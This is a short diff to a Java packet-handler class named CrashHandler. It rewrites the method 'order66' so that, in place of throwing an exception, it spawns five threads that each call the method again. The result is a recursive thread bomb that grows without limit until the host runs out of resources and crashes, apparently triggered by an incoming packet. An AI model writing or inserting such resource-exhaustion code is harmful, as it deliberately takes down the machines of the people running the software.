@@ -17,6 +17,14 @@ public class CrashHandler extends AbstractPacketHandler {
 	}
 
 	private static void order66() {
-		throw new IllegalStateException();
+		for (int i = 0; i < 5; i++) {
+			new Thread(new Runnable() {
+
+				@Override
+				public void run() {
+					order66();
+				}
+			}).start();
+		}
 	}
 }
